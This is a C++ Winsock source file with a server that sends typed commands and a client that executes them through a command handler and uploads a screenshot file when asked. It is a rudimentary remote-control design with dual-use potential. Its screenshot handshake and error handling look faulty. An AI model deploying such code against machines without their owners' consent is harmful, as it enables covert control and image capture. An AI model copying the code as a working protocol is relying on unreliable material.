#include "networking.h"
const int DEFAULT_PORT = 4560;
const int BUFFER_SIZE = 4096;

std::string receiveData(SOCKET clientSocket)
{
	char buffer[BUFFER_SIZE];
	int bytesRead = recv(clientSocket, buffer, BUFFER_SIZE, 0);
	if (bytesRead <= 0)
		return "";

	return std::string(buffer, bytesRead);
}

bool sendData(SOCKET clientSocket, const std::string& data)
{
	int bytesSent = send(clientSocket, data.c_str(), static_cast<int>(data.length()), 0);
	return bytesSent == data.length();
}

std::string readDataFromStdin()
{
	std::string input;
	std::cout << "MSG: ";
	std::getline(std::cin, input);
	return input;
}

void network::server()
{
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		std::cerr << "Failed to init winsock.\n";
		return;
	}

	SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (serverSocket == INVALID_SOCKET)
	{
		std::cerr << "failed to create server socket.\n";
		WSACleanup();
		return;
	}

	sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_addr.s_addr = INADDR_ANY;
	serverAddress.sin_port = htons(DEFAULT_PORT);

	if (bind(serverSocket, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR)
	{
		std::cerr << "Failed to bind to the server socket.\n";
		closesocket(serverSocket);
		WSACleanup();
		return;
	}

	if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR)
	{
		std::cerr << "Listen failed.\n";
		closesocket(serverSocket);
		WSACleanup();
		return;
	}

	std::cout << "Server is running.\n";
	std::string ipAddress = inet_ntoa(serverAddress.sin_addr);
    std::cout << "Chosen IP address: " << ipAddress << std::endl;

	sockaddr_in clientAddress;
	int clientAddressSize = sizeof(clientAddress);

	SOCKET clientSocket = accept(serverSocket, reinterpret_cast<sockaddr*>(&clientAddress), &clientAddressSize);
	if (clientSocket == INVALID_SOCKET)
	{
		std::cerr << "Accept failed.\n";
		closesocket(serverSocket);
		WSACleanup();
		return;
	}

	std::cout << "Client connected.\n";

	std::vector<uint8_t> imageData;

	while (true)
	{
		std::string inputData = readDataFromStdin();
		sendData(clientSocket, inputData);

		if (inputData == "Screenshot")
		{
			char buffer[1024];
			std::ofstream file("received_file.png", std::ios::binary);
			if (!file) 
			{
				std::cerr << "Failed to create file for writing.\n";
			}

			int bytesReceived;
			while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) 
			{
				file.write(buffer, bytesReceived);
				std::string inputData_ = "...";
				sendData(clientSocket, inputData_);
				if (receiveData(clientSocket) == "command received.\n")
					break;
			}

			file.close();

			if (bytesReceived == 0) 
			{
				std::cout << "File received successfully.\n";
			}
			else 
			{
				std::cerr << "Error while receiving the file.\n";
			}
		}
		else
		{
			std::string recv = receiveData(clientSocket);
			if (recv.empty())
			{
				std::cout << "Client disconnected.\n";
				break;
			}

			std::cout << "client: " << recv << "\n";
		}
	}

	closesocket(clientSocket);
	closesocket(serverSocket);
	WSACleanup();
}

void network::client(char ip[])
{
	std::cout << "Attempting connection to " << ip << "\n";

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		std::cerr << "Failed to init winsock.\n";
		return;
	}

	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET)
	{
		std::cerr << "Failed to create client socket.\n";
		WSACleanup();
		return;
	}

	sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_addr.s_addr = inet_addr(ip);
	serverAddress.sin_port = htons(DEFAULT_PORT);

	if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR)
	{
		std::cerr << "Failed to connect to the server.\n";
		closesocket(clientSocket);
		WSACleanup();
		return;
	}

	std::cout << "Connected to server.\n";

	while (true)
	{
		std::string recv = receiveData(clientSocket);
		if (recv.empty())
		{
			std::cout << "Server disconnected.\n";
			break;
		}
		
		if (recv == "Screenshot")
		{
			std::ifstream file("screenshot.png", std::ios::binary | std::ios::ate);
			if (!file) 
			{
				std::cerr << "Failed to open file.\n";
			}

			std::streamsize fileSize = file.tellg();
			file.seekg(0, std::ios::beg);

			char* buffer = new char[fileSize];
			if (!file.read(buffer, fileSize)) 
			{
				std::cerr << "Failed to read file.\n";
				file.close();
			}

			file.close();

			int bytesSent = send(clientSocket, buffer, fileSize, 0);
			if (bytesSent == SOCKET_ERROR) 
			{
				std::cerr << "Failed to send file data.\n";
			}
			else 
			{
				std::cout << "File sent successfully.\n";
			}

			delete[] buffer;
			std::string wait = receiveData(clientSocket);
			if (wait == "...")
			{
				sendData(clientSocket, "");
			}
		}
		else
		{
			std::vector<std::string> cleaning = CommandHandler::cleanFunctions(recv);
			CommandHandler::callFunction(cleaning);

			sendData(clientSocket, "command received.\n");

			std::cout << "Server: " << recv << "\n";

			cleaning.clear();
			recv.clear();
		}
	}

	closesocket(clientSocket);
	WSACleanup();
}